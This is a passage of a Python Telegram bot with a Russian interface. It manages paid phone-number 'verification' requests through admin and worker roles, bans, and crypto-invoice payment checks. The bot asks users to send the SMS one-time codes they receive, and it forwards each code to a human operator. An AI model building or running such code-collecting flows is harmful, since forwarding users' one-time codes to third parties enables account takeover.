    admins = int(cur.fetchone()[0])
    cur.execute("SELECT COUNT(*) FROM user_flags WHERE role='worker'")
    workers = int(cur.fetchone()[0])
    cur.execute("SELECT COUNT(*) FROM user_flags WHERE free_access=1")
    free_count = int(cur.fetchone()[0])
    cur.execute("SELECT COUNT(*) FROM user_flags WHERE priority_access=1")
    prio_count = int(cur.fetchone()[0])
    cur.execute("SELECT COUNT(*) FROM user_flags WHERE banned=1")
    banned_count = int(cur.fetchone()[0])
    cur.execute("SELECT COUNT(*) FROM verification_requests WHERE status='awaiting_payment'")
    waiting_payment = int(cur.fetchone()[0])
    cur.execute("SELECT COUNT(*) FROM verification_requests WHERE status='paid_queued'")
    queued = int(cur.fetchone()[0])
    cur.execute("SELECT COUNT(*) FROM verification_requests WHERE status='verified'")
    verified = int(cur.fetchone()[0])
    conn.close()

    text = (
        "📊 Статистика:\n"
        f"👥 Пользователи: {users}\n"
        f"🛡 Админы (выданные): {admins}\n"
        f"👷 Рабочие: {workers}\n"
        f"🎁 Free доступ: {free_count}\n"
        f"⚡ Priority доступ: {prio_count}\n"
        f"⛔ Бан: {banned_count}\n"
        f"💳 Ожидают оплату: {waiting_payment}\n"
        f"🧾 В очереди: {queued}\n"
        f"✅ Успешно верифицировано: {verified}"
    )
    await callback.message.answer(text)
    await callback.answer()


@router.callback_query(F.data.startswith("admin_setrole:"))
@router.callback_query(F.data.startswith("admin_setfree:"))
@router.callback_query(F.data.startswith("admin_setprio:"))
@router.callback_query(F.data.startswith("admin_setban:"))
async def admin_setter_entry(callback: CallbackQuery, state: FSMContext, config: Config):
    actor = normalize_username(callback.from_user.username)
    if not is_admin(actor, config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    action, value = callback.data.split(":", 1)
    await state.set_state(AdminStates.waiting_input)
    await state.update_data(admin_action=action, admin_value=value)
    await callback.message.answer("👤 Отправь username (пример: @username)")
    await callback.answer()


@router.message(AdminStates.waiting_input)
async def admin_input_apply(message: Message, state: FSMContext, config: Config):
    actor = normalize_username(message.from_user.username)
    if not is_admin(actor, config):
        await message.answer("⛔ Нет доступа")
        await state.clear()
        return

    data = await state.get_data()
    action = data.get("admin_action")
    value = data.get("admin_value")

    target = normalize_username(message.text)
    if not target:
        await message.answer("❌ Некорректный username. Пример: @username")
        return

    if action == "admin_find_user":
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute(
            """
            SELECT u.user_id, u.full_name, u.last_seen_at, COALESCE(f.role,'user'), COALESCE(f.free_access,0), COALESCE(f.priority_access,0), COALESCE(f.banned,0)
            FROM users u LEFT JOIN user_flags f ON u.username=f.username
            WHERE u.username=?
            """,
            (target,),
        )
        profile = cur.fetchone()
        cur.execute(
            "SELECT id, operator, phone, status, created_at FROM verification_requests WHERE username=? ORDER BY id DESC LIMIT 8",
            (target,),
        )
        requests = cur.fetchall()
        conn.close()

        if not profile:
            flags = get_flags(target)
            await message.answer(
                f"🔎 @{target} не найден среди активных users.\n"
                f"role={flags['role']} free={flags['free_access']} priority={flags['priority_access']} banned={flags['banned']}"
            )
            await state.clear()
            return

        user_id, full_name, last_seen, role, free_access, prio, banned = profile
        lines = [
            f"👤 Профиль @{target}",
            f"Имя: {full_name}",
            f"id: {user_id}",
            f"last_seen: {last_seen}",
            f"role: {role} | free:{free_access} | priority:{prio} | banned:{banned}",
            "🧾 Последние заявки:",
        ]
        if not requests:
            lines.append("нет заявок")
        else:
            for req_id, operator, phone, status, created_at in requests:
                lines.append(f"#{req_id} | {operator} | {phone} | {status} | {created_at}")
        await message.answer("\n".join(lines))
        await state.clear()
        return

    if action == "admin_setrole":
        if target in config.superadmins and value != "admin":
            await message.answer("⛔ Нельзя менять роль SUPERADMINS из .env")
            await state.clear()
            return
        role_map = {"admin": "admin", "user": "user", "worker": "worker"}
        if value not in role_map:
            await message.answer("⚠️ Неизвестная роль")
            await state.clear()
            return
        set_role(target, role_map[value])
        log_admin_action(actor, "set_role", target, f"value={value}")
        await message.answer(f"✅ Роль для @{target} обновлена: {value}")
    elif action == "admin_setfree":
        set_access(target, free=1 if value == "1" else 0)
        log_admin_action(actor, "set_free", target, f"value={value}")
        await message.answer(f"🎁 free-доступ для @{target}: {value}")
    elif action == "admin_setprio":
        set_access(target, prio=1 if value == "1" else 0)
        log_admin_action(actor, "set_priority", target, f"value={value}")
        await message.answer(f"⚡ приоритет для @{target}: {value}")
    elif action == "admin_setban":
        if value == "1" and target in config.superadmins:
            await message.answer("⛔ Нельзя банить SUPERADMINS из .env")
            await state.clear()
            return
        set_access(target, ban=1 if value == "1" else 0)
        log_admin_action(actor, "set_ban", target, f"value={value}")
        await message.answer(f"⛔ бан для @{target}: {value}")
    else:
        await message.answer("⚠️ Неизвестное действие")

    await state.clear()


@router.callback_query(F.data.startswith("worker_need_code:"))
@router.callback_query(F.data.startswith("worker_success:"))
@router.callback_query(F.data.startswith("worker_error:"))
async def worker_request_actions(callback: CallbackQuery, bot: Bot, config: Config):
    actor = normalize_username(callback.from_user.username)
    if not is_worker(actor, config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    action, request_id_raw = callback.data.split(":", 1)
    request_id = int(request_id_raw)
    row = get_request(request_id)
    if not row:
        await callback.answer("❌ Заявка не найдена", show_alert=True)
        return

    assigned_id = row[9]
    if assigned_id and int(assigned_id) != callback.from_user.id:
        await callback.answer("⛔ Заявка закреплена за другим исполнителем", show_alert=True)
        return

    user_id = row[1]

    if action == "worker_need_code":
        update_request_status(request_id, "waiting_user_code", callback.from_user.id)
        log_admin_action(actor, "worker_request_sms_code", row[2], f"request_id={request_id}")
        await bot.send_message(user_id, f"🔐 По заявке #{request_id} введи код из SMS одним сообщением.")
        await callback.answer("🔐 Запрос кода отправлен")
        await callback.message.edit_text(request_caption(get_request(request_id)), reply_markup=build_worker_request_actions(request_id))
        return

    if action == "worker_success":
        update_request_status(request_id, "verified", callback.from_user.id)
        log_admin_action(actor, "worker_verify_success", row[2], f"request_id={request_id}")
        await bot.send_message(user_id, f"✅ Ваш номер {row[5]} успешно верифицирован.")
        await callback.answer("✅ Отправлено: успешно")
        await callback.message.edit_text(request_caption(get_request(request_id)))
        await callback.message.answer("✅ Готово. Можешь взять следующий номер.", reply_markup=build_worker_panel_menu())
        return

    if action == "worker_error":
        update_request_status(request_id, "verification_error", callback.from_user.id)
        log_admin_action(actor, "worker_verify_error", row[2], f"request_id={request_id}")
        await bot.send_message(user_id, f"❌ По вашему номеру {row[5]} произошла ошибка при верификации.")
        await callback.answer("❌ Отправлено: ошибка")
        await callback.message.edit_text(request_caption(get_request(request_id)))
        await callback.message.answer("✅ Готово. Можешь взять следующий номер.", reply_markup=build_worker_panel_menu())
        return


@router.callback_query(F.data.startswith("admin_"))
async def admin_request_actions(callback: CallbackQuery, bot: Bot, config: Config):
    actor = normalize_username(callback.from_user.username)
    if not is_admin(actor, config):
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    action, request_id_raw = callback.data.split(":", 1)
    request_id = int(request_id_raw)
    row = get_request(request_id)
    if not row:
        await callback.answer("❌ Заявка не найдена", show_alert=True)
        return

    user_id = row[1]

    if action == "admin_take":
        update_request_status(request_id, "in_progress", callback.from_user.id)
        log_admin_action(actor, "take_request", row[2], f"request_id={request_id}")
        await callback.answer("🧰 Заявка взята")
        await callback.message.edit_text(request_caption(get_request(request_id)), reply_markup=build_admin_request_actions(request_id))
        return

    if action == "admin_need_code":
        update_request_status(request_id, "waiting_user_code", callback.from_user.id)
        log_admin_action(actor, "request_sms_code", row[2], f"request_id={request_id}")
        await bot.send_message(user_id, f"🔐 По заявке #{request_id} введи код из SMS одним сообщением.")
        await callback.answer("🔐 Запрос кода отправлен")
        await callback.message.edit_text(request_caption(get_request(request_id)), reply_markup=build_admin_request_actions(request_id))
        return

    if action == "admin_success":
        update_request_status(request_id, "verified", callback.from_user.id)
        log_admin_action(actor, "verify_success", row[2], f"request_id={request_id}")
        await bot.send_message(user_id, f"✅ Ваш номер {row[5]} успешно верифицирован.")
        await callback.answer("✅ Отправлено: успешно")
        await callback.message.edit_text(request_caption(get_request(request_id)))
        return

    if action == "admin_error":
        update_request_status(request_id, "verification_error", callback.from_user.id)
        log_admin_action(actor, "verify_error", row[2], f"request_id={request_id}")
        await bot.send_message(user_id, f"❌ По вашему номеру {row[5]} произошла ошибка при верификации.")
        await callback.answer("❌ Отправлено: ошибка")
        await callback.message.edit_text(request_caption(get_request(request_id)))
        return


@router.message(F.text.regexp(r"^\d{3,10}$|^[A-Za-z0-9]{3,12}$"))
async def receive_sms_code(message: Message, bot: Bot, config: Config):
    upsert_user(message.from_user.id, normalize_username(message.from_user.username), message.from_user.full_name)

    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute(
        "SELECT id, assigned_admin_id FROM verification_requests WHERE user_id=? AND status='waiting_user_code' ORDER BY id DESC LIMIT 1",
        (message.from_user.id,),
    )
    row = cur.fetchone()
    conn.close()

    if not row:
        return

    request_id, assigned_admin = row
    code = message.text.strip()
    save_sms_code(request_id, code)
    await message.answer("✅ Код принят, ожидайте результата.")

    text = f"📩 По заявке #{request_id} пользователь отправил код: {code}"
    if assigned_admin:
        try:
            await bot.send_message(assigned_admin, text)
            return
        except TelegramBadRequest:
            pass
    await notify_admins(bot, config, text)


async def auto_payment_worker(bot: Bot, config: Config, stop_event: asyncio.Event):
    while not stop_event.is_set():
        try:
            conn = sqlite3.connect(DB_PATH)
            cur = conn.cursor()
            cur.execute(
                "SELECT id, crypto_invoice_id FROM verification_requests WHERE status='awaiting_payment' AND crypto_invoice_id IS NOT NULL ORDER BY id ASC LIMIT 40"
            )
            pending = cur.fetchall()
            conn.close()

            for request_id, invoice_id in pending:
                if not invoice_id:
                    continue
                try:
                    status = await get_crypto_invoice_status(config, int(invoice_id))
                except Exception:
                    continue
                if status == "paid":
                    await promote_paid_request(bot, config, int(request_id), "auto")
        except Exception:
            logging.exception("auto_payment_worker_failed")

        try:
            await asyncio.wait_for(stop_event.wait(), timeout=config.auto_pay_check_interval)
        except asyncio.TimeoutError:
            pass


async def main():
    logging.basicConfig(level=logging.INFO)
    config = load_config()
    init_db()

    bot = Bot(token=config.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher(storage=MemoryStorage())
    dp["config"] = config
    dp.include_router(router)

    stop_event = asyncio.Event()
    worker_task = asyncio.create_task(auto_payment_worker(bot, config, stop_event))
    try:
        await dp.start_polling(bot)
    finally:
        stop_event.set()
        worker_task.cancel()
        with contextlib.suppress(Exception):
            await worker_task


if __name__ == "__main__":
    import contextlib

    asyncio.run(main())



